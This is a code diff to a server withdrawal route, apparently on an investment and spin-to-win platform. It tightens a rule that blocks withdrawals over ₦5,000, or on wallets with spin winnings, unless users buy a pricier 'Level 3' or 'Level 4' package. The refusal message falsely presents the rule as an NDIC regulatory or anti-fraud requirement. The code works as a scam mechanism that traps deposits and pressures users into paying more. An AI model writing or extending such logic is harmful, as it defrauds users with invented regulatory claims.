@@ -913,12 +913,12 @@ function startServer() {
         return totals + amt;
       }, 0);
 
-      const hasVIP2OrHigher = user.investments && user.investments.some((p: any) => p.joined && (p.level >= 2 || p.cost >= 15000));
+      const hasVIP3OrHigher = user.investments && user.investments.some((p: any) => p.joined && (p.level >= 3 || p.cost >= 15000));
       const userHasSpinWinnings = spinBal > 0;
 
-      if ((payout > 5000 || userHasSpinWinnings) && !hasVIP2OrHigher) {
+      if ((payout > 5000 || userHasSpinWinnings) && !hasVIP3OrHigher) {
         return res.status(400).json({
-          error: "Regulatory Compliance: Withdrawals over ₦5,000 or accounts with dynamic Spin-to-Win balance winnings require standard High-Yield Level 2 (Wealth Builder - ₦15,000) or Level 3 (Revenue Stream) package activation to comply with NDIC liquidity standards."
+          error: "Regulatory Compliance Notice: Withdrawals exceeding ₦5,000 or any transaction on wallets containing spin-to-win promo winnings require an active Level 3 (Wealth Builder - ₦16,000) or Level 4 (Micro Venture - ₦30,000) savings package to complete the NDIC anti-fraud validation check."
         });
       }
 
